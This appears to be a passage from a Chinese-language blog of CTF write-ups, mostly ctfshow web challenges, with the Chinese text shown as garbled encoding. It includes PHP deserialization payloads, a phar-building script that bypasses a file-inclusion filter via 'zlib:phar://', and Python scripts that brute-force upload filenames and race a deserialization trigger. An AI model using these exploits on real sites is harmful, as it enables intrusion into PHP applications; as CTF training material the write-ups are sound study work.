class="string">&#x27;ctfshow&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$str</span> = file_get_contents(<span class="string">&quot;php://input&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\_|\.|\]|\[/is&#x27;</span>,<span class="variable">$str</span>))&#123;            </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;I am sorry but you have to leave.&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    extract(<span class="variable">$_POST</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ser</span> = filter(serialize(<span class="keyword">new</span> spaceman(<span class="variable">$user_name</span>,<span class="variable">$pass_word</span>)));</span><br><span class="line"><span class="variable">$test</span> = unserialize(<span class="variable">$ser</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥å‘ç°ç»™å‡ºäº†ä¸€ä¸ªä¸¤ä¸ªå­—ç¬¦é•¿è¾¹çŸ­çš„ååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸ã€‚ä½†æ˜¯è·Ÿåˆ°ä¸‹é¢å¯ä»¥å‘ç° <code>$pass_word</code> å…¶å®æ˜¯å¯æ§çš„ã€‚å› æ­¤åªéœ€è¦æ„é€ å¦‚ä¸‹ POST å‚æ•°å°±è¡Œã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user[name&#x3D;lemonprefect&amp;pass[word&#x3D;ctfshowvip</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow&#123;661aa8e7-658d-4615-bec6-0479b2af71f1&#125;</span><br></pre></td></tr></table></figure><h3 id="æœ‰æ‰‹å°±è¡Œ"><a href="#æœ‰æ‰‹å°±è¡Œ" class="headerlink" title="æœ‰æ‰‹å°±è¡Œ"></a>æœ‰æ‰‹å°±è¡Œ</h3><p>ä¼ å…¥ GET å‚æ•° <code>.../?file=flag</code>ï¼Œå³å¯åœ¨æºç ç§å‘ç°ä¸€å¼ å°ç¨‹åºç çš„å›¾ç‰‡çš„ base64 å­—ç¬¦ä¸²ï¼Œå°†å…¶è§£ç åå¯å¾—å¦‚ä¸‹å›¾ç‰‡ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/d6e98991-aedd-49de-83ea-90033d0eac80/1613213954003065/a82ea41977e509a00fbab32bbe9e807b226ca507.png"></p><p>æ‰«æä¹‹åå¯ä»¥å‘ç°æ˜¯ä¸€ä¸ªçˆ¬æ¥¼çš„å°æ¸¸æˆï¼Œå¾—çˆ¬åˆ° 54429731 å±‚æ‰èƒ½æ‹¿åˆ° flagã€‚å¯ä»¥åç¼–è¯‘å°ç¨‹åºæ¥æ‹¿åˆ° flagã€‚</p><blockquote><p>æ’æ›²ï¼šHyper-V ä¼šå¯¼è‡´ VT-x æ— æ³•è¢« Android è™šæ‹Ÿæœºä½¿ç”¨ã€‚åªéœ€è¦æš‚æ—¶åœç”¨ Hyper-V å†é‡å¯å³å¯ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bcdedit /set hypervisorlaunchtype off  ;åœç”¨</span><br><span class="line">bcdedit /set hypervisorlaunchtype Auto ;æ¢å¤</span><br></pre></td></tr></table></figure><p>æ³¨æ„ï¼šä¸€æ—¦åœç”¨äº† Hyper-V å¯èƒ½éœ€è¦é‡æ–°å‹¾é€‰ Hyper-V çš„ Windows åŠŸèƒ½æ‰èƒ½æ¢å¤ã€‚</p></blockquote><p>å°†å¾®ä¿¡å°ç¨‹åºçš„ç¨‹åºåŒ…ä» <code>/data/data/com.tencent.mm/MicroMsg/bf10a35efc5fc9b37707a65b7f678057/appbrand/pkg</code> ä¸‹å–å‡ºã€‚ä½¿ç”¨ <code>wuWxapkg.js</code> å°†å…¶åç¼–è¯‘ååœ¨ç”Ÿæˆçš„ç›®å½•çš„ <code>pages/index</code> ä¸‹å¯ä»¥æ‰¾åˆ° index.jsã€‚å°†å…¶æ‰“å¼€å¯ä»¥å‘ç°å…¶ä¸­è®°å½•ç€å¦‚ä¸‹å†…å®¹ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">decode: <span class="function"><span class="keyword">function</span>(<span class="params">a</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;flag&#123;hahahawxunapk&#125;&quot;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;hahahawxunapk&#125;</span><br></pre></td></tr></table></figure><h3 id="è™å±±è¡Œ"><a href="#è™å±±è¡Œ" class="headerlink" title="è™å±±è¡Œ"></a>è™å±±è¡Œ</h3><p>åœ¨ <code>../mc-admin/page-edit.php</code> é¡µé¢ä¸‹å‘ç°ä»»æ„æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œä½†æ˜¯è¯»å–ä¸åˆ° flagã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/d6e98991-aedd-49de-83ea-90033d0eac80/1613213954130695/155ac50574af2de72c0e6d26082fd0b2f23a5bc1.png"></p><p>è®¿é—®ä¸Šé¢ç»™å‡ºçš„æ–°è·¯ç”±ï¼Œå¾—åˆ°å¦‚ä¸‹æºç ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;waf.php&#x27;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Ctfshow</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ctfer</span> = <span class="string">&#x27;shower&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        system(<span class="string">&#x27;cp /hint* /var/www/html/hint.txt&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$filename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">readgzfile(waf(<span class="variable">$filename</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>åŒæ—¶åœ¨ç®¡ç†é¢æ¿ä¸‹å¯ä»¥çœ‹åˆ°ä¸€ä¸ªå¾ˆæ˜¾çœ¼çš„ä¸Šä¼ ç‚¹ï¼Œè·¯ç”±æ˜¯ <code>../upload.php</code>ã€‚ä½¿ç”¨ä¸Šè¿°çš„æ–‡ä»¶åŒ…å«è¯»å–å‡ºå¦‚ä¸‹æºç ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">// å…è®¸ä¸Šä¼ çš„å›¾ç‰‡åç¼€</span></span><br><span class="line"><span class="variable">$allowedExts</span> = <span class="keyword">array</span>(<span class="string">&quot;gif&quot;</span>, <span class="string">&quot;jpg&quot;</span>, <span class="string">&quot;png&quot;</span>);</span><br><span class="line"><span class="variable">$temp</span> = explode(<span class="string">&quot;.&quot;</span>, <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br><span class="line"><span class="comment">// echo $_FILES[&quot;file&quot;][&quot;size&quot;];</span></span><br><span class="line"><span class="variable">$extension</span> = end(<span class="variable">$temp</span>);     <span class="comment">// è·å–æ–‡ä»¶åç¼€å</span></span><br><span class="line"><span class="keyword">if</span> (((<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;type&quot;</span>] == <span class="string">&quot;image/gif&quot;</span>)</span><br><span class="line">|| (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;type&quot;</span>] == <span class="string">&quot;image/jpeg&quot;</span>)</span><br><span class="line">|| (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;type&quot;</span>] == <span class="string">&quot;image/png&quot;</span>))</span><br><span class="line">&amp;&amp; (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>] &lt; <span class="number">2048000</span>)   <span class="comment">// å°äº 2000kb</span></span><br><span class="line">&amp;&amp; in_array(<span class="variable">$extension</span>, <span class="variable">$allowedExts</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>] &gt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;æ–‡ä»¶å‡ºé”™: &quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>] . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (file_exists(<span class="string">&quot;upload/&quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>] . <span class="string">&quot; æ–‡ä»¶å·²ç»å­˜åœ¨ã€‚ &quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$md5_unix_random</span> =substr(md5(time()),<span class="number">0</span>,<span class="number">8</span>);</span><br><span class="line"><span class="variable">$filename</span> = <span class="variable">$md5_unix_random</span>.<span class="string">&#x27;.&#x27;</span>.<span class="variable">$extension</span>;</span><br><span class="line">            move_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="string">&quot;upload/&quot;</span> . <span class="variable">$filename</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;ä¸Šä¼ æˆåŠŸ,æ–‡ä»¶å­˜åœ¨upload/&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;æ–‡ä»¶ç±»å‹ä»…æ”¯æŒjpgã€pngã€gifç­‰å›¾ç‰‡æ ¼å¼&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥å‘ç°ä¸Šä¼ åæ— æ³•å¾—çŸ¥æ–‡ä»¶åï¼Œè€Œä¸”åªèƒ½ä¸Šä¼ å›¾ç‰‡ï¼Œå› æ­¤éœ€è¦æƒ³åŠæ³•ç»•è¿‡ä¸Šä¼ é™åˆ¶ä¸”è§¦å‘åˆ° <code>Ctfshow</code> çš„ååºåˆ—åŒ–ä»è€Œæ‹¿åˆ°ä¸‹ä¸€æ­¥çš„ hintã€‚ä½¿ç”¨ <code>../../../ctfshowsecretfilehh/waf.php</code> å¯ä»¥åŒ…å«åˆ° waf çš„å†…å®¹ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&quot;/^phar|smtp|dict|zip|compress|file|etc|root|filter|php|flag|ctf|hint|\.\.\//i&quot;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;å§¿åŠ¿å¤ªç®€å•å•¦ï¼Œæ¥ä¸€ç‚¹éªšçš„ï¼Ÿï¼&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>æŸ¥é˜…äº†èµ„æ–™ä¹‹åå‘ç° phar çš„åˆ©ç”¨å§¿åŠ¿ä¸­æœ‰ <code>zlib:phar://</code> æ­£å¥½æ²¡è¢«è¿™ä¸ªæ­£åˆ™è¿‡æ»¤åˆ°ã€‚ä½¿ç”¨å¦‚ä¸‹çš„ä»£ç æ¥ç”Ÿæˆä¸€ä¸ª phar åŒ…ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Ctfshow</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ctfer</span> = <span class="string">&#x27;shower&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;trigger.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line"><span class="variable">$phar</span>-&gt;setStub(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$object</span> = <span class="keyword">new</span> Ctfshow();</span><br><span class="line"><span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$object</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;exp.txt&quot;</span>,<span class="string">&quot;actuallyNothingHere&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;stopBuffering();</span><br></pre></td></tr></table></figure><p>å› ä¸ºè¿™é‡Œæ²¡ç»™æ–‡ä»¶åï¼Œæ‰€ä»¥éœ€è¦å†™ä¸ªè„šæœ¬å»ä¸Šä¼ ï¼Œè¿™æ ·æ‰èƒ½å°†æ—¶é—´æˆ³èŒƒå›´ç¡®å®šä»è€Œæ‰¾åˆ°æ­£ç¡®çš„æ–‡ä»¶åç”¨äºæ–‡ä»¶åŒ…å«ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ENV = <span class="string">&quot;http://e2c57b3b-c22d-4267-bef2-8e47e9b13b4e.chall.ctf.show/&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">composeUrl</span>(<span class="params">timeNow</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&#123;&#125;upload/&#123;&#125;.gif&quot;</span>.<span class="built_in">format</span>(ENV, (hashlib.md5(<span class="built_in">str</span>(<span class="built_in">int</span>(timeNow)).encode()).hexdigest())[:<span class="number">8</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    url = <span class="string">&quot;&#123;&#125;upload.php&quot;</span>.<span class="built_in">format</span>(ENV)</span><br><span class="line">    file = &#123;</span><br><span class="line">        <span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;exp.gif&#x27;</span>, <span class="built_in">open</span>(<span class="string">&quot;trigger.gif&quot;</span>, <span class="string">&#x27;rb&#x27;</span>), <span class="string">&quot;image/gif&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    response = requests.post(url=url, files=file)</span><br><span class="line">    now = time.time()</span><br><span class="line">    nowUrl = composeUrl(now - <span class="number">1</span>)</span><br><span class="line">    accessResponse = requests.get(nowUrl)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Trying with url &#123;&#125;&quot;</span>.<span class="built_in">format</span>(nowUrl))</span><br><span class="line">    <span class="keyword">if</span>(<span class="string">&quot;install.php&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> accessResponse.text):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] Found! &#123;&#125;&quot;</span>.<span class="built_in">format</span>(nowUrl))</span><br><span class="line">        exit()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        time.sleep(<span class="number">0.2</span>)</span><br></pre></td></tr></table></figure><p>è¿è¡Œä¸Šè¿°è„šæœ¬å¯ä»¥å¾—å‡ºä¸€ä¸ªå¯ä»¥æˆåŠŸåŒ…å«ä¸Šä¼ æ–‡ä»¶çš„é“¾æ¥ã€‚</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://e2c57b3b-c22d-4267-bef2-8e47e9b13b4e.chall.ctf.show/upload/21116d8b.gif</span><br></pre></td></tr></table></figure><p>è®¿é—® <code>.../hint.txt</code> å¯ä»¥å¾—åˆ°å¦‚ä¸‹ä¿¡æ¯ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;fuckflag***&#125;flag also not here You can access ctfshowgetflaghhhh directory</span><br></pre></td></tr></table></figure><p>è®¿é—® <code>.../ctfshowgetflaghhhh</code> å¯ä»¥è·å¾—å¦‚ä¸‹æºç ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$unser</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;unser&#x27;</span>];</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Unser</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;Firebasky&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;username==<span class="string">&#x27;ctfshow&#x27;</span>&amp;&amp;<span class="keyword">$this</span>-&gt;password==(<span class="keyword">int</span>)md5(time()))&#123;</span><br><span class="line">            system(<span class="string">&#x27;cp /ctfshow* /var/www/html/flag.txt&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ctf</span>=@unserialize(<span class="variable">$unser</span>);</span><br><span class="line">system(<span class="string">&#x27;rm -rf /var/www/html/flag.txt&#x27;</span>);</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæœ‰ä¸€ç‚¹å° trickï¼Œ<code>(int)md5(time())</code> æœ‰å¾ˆå¤§çš„æœºä¼šå–åˆ° 0ï¼Œæ‰€ä»¥è¿™é‡Œåœ¨ååºåˆ—åŒ–ä¸­å‡å®šå…¶ä¸º 0 å¯ä»¥æ›´æ–¹ä¾¿åœ°æ„é€ ã€‚ä½¿ç”¨å¤šçº¿ç¨‹è„šæœ¬è¿›è¡Œæ¡ä»¶ç«äº‰ï¼Œè¿™æ ·æ‰èƒ½è¯»åˆ° flagã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">ENV = <span class="string">&quot;http://2acf732a-6d3b-4c16-b9f2-532ae48ca97e.chall.ctf.show/&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Unserialization</span>():</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Unserialization thread lanched&quot;</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        param = &#123;</span><br><span class="line">            <span class="string">&quot;unser&quot;</span>: <span class="string">&#x27;O:5:&quot;Unser&quot;:2:&#123;s:8:&quot;username&quot;;s:7:&quot;ctfshow&quot;;s:8:&quot;password&quot;;i:0;&#125;&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        requests.get(url=<span class="string">&quot;&#123;&#125;ctfshowgetflaghhhh&quot;</span>.<span class="built_in">format</span>(ENV),params=param)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GetFlag</span>():</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Get flag thread lanched&quot;</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        response = requests.get(url=<span class="string">&quot;&#123;&#125;flag.txt&quot;</span>.<span class="built_in">format</span>(ENV))</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&quot;install.php&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> response.text):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[*] Found flag in &#123;&#125;&quot;</span>.<span class="built_in">format</span>(response.content.decode(<span class="string">&quot;UTF-8&quot;</span>)))</span><br><span class="line">            event.clear()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[!] Get flag thread retry&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">event = threading.Event()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">    threading.Thread(target=Unserialization, args=()).start()</span><br><span class="line">    threading.Thread(target=GetFlag, args=()).start()</span><br></pre></td></tr></table></figure><p>è¿è¡Œå¯ä»¥å¾—åˆ° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow&#123;229c1b86-f183-4520-8792-1e78448dad62&#125;</span><br></pre></td></tr></table></figure><h3 id="è™å±±è¡Œâ€™s-revenge"><a href="#è™å±±è¡Œâ€™s-revenge" class="headerlink" title="è™å±±è¡Œâ€™s revenge"></a>è™å±±è¡Œâ€™s revenge</h3><p>è·Ÿè™å±±è¡Œç›¸æ¯”ï¼Œç›®å½•æœ‰æ‰€å˜æ›´ã€‚</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="deletion">- ctfshowsecretfilehh</span></span><br><span class="line"><span class="addition">+ hsxhsxhsxctfshowsecretfilel</span></span><br></pre></td></tr></table></figure><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="deletion">- ctfshowgetflaghhhh</span></span><br><span class="line"><span class="addition">+ hsxctfshowsecretgetflagl</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow&#123;5a01f428-4ffa-44bc-aab5-571d5ebbfaa6&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>justCTF 2020</title>
      <link href="/zh-CN/posts/5b5c6f4d.html"/>
      <url>/zh-CN/posts/5b5c6f4d.html</url>
      
        <content type="html"><![CDATA[<h3 id="Sanity-Check"><a href="#Sanity-Check" class="headerlink" title="Sanity Check"></a>Sanity Check</h3><p>ç»™å‡ºçš„é“¾æ¥æ˜¯ <code>Rule The World</code> çš„æ’­æ”¾é“¾æ¥ã€‚è€Œç½‘ç«™ä¸Šçš„ RULES é‡Œé¢æœ‰ <code>All flags fall into the following format: justCTF&#123;something_h3re!&#125;, unless the challenge description states otherwise.</code> çš„æè¿°ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">justCTF&#123;something_h3re!&#125;</span><br></pre></td></tr></table></figure><h3 id="PDF-is-broken-and-so-is-this-file"><a href="#PDF-is-broken-and-so-is-this-file" class="headerlink" title="PDF is broken, and so is this file"></a>PDF is broken, and so is this file</h3><p>ä½¿ç”¨ 010 editor æ‰“å¼€æ‰€ç»™çš„ pdf å¯ä»¥å‘ç°å…¶ä¸­éšè—äº†å¾ˆå¤šæ–‡ä»¶ã€‚foremost åˆ†ç¦»å‡ºæ¥ï¼Œåœ¨ zip ç›®å½•ä¸‹å‘ç°å¯ä»¥è§£å‹çš„å‹ç¼©æ–‡æ¡£ã€‚å…¶ä¸­åŒ…å«ä¸€ä¸ªå·¥å…·å’Œå¦‚ä¸‹è¯´æ˜ã€‚</p><blockquote><p>You didnâ€™t think it would be this easy, did you?</p><p><a href="https://www.youtube.com/watch?v=VVdmmN0su6E#t=11m32s">https://www.youtube.com/watch?v=VVdmmN0su6E#t=11m32s</a></p><p>Maybe try running <code>./mutool draw -r 300 -o rendered.png</code> on this PDF</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;$ docker run -ti --rm -w /workdir/ --mount <span class="built_in">type</span>=<span class="built_in">bind</span>,<span class="built_in">source</span>=<span class="string">&quot;<span class="variable">$PWD</span>&quot;</span>,target=/workdir ubuntu:bionic ./mutool </span><br></pre></td></tr></table></figure></blockquote><p>æŒ‰ç…§æç¤ºæ‰€ç»™çš„ä¿¡æ¯è¿è¡Œ mutool å¯ä»¥ç”Ÿæˆä¸€å¼ å›¾ç‰‡ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/f8f4ba93-7e20-4518-91da-26d067ee93f9/1613214058732567/0130fefdb8fa91c1f87c2119abe9938533e2d888.png"></p><blockquote><p><strong>LMGTFY</strong>: Let Me Google That For You</p></blockquote><p>åœ¨æœç´¢å¼•æ“ä¸Šæ‰¾ <code>2642 didier &quot;42 bytes&quot; object</code>ï¼Œå¯ä»¥å‘ç°ä¸€ç¯‡<a href="https://blog.didierstevens.com/2008/05/19/pdf-stream-objects/">æ–‡ç« 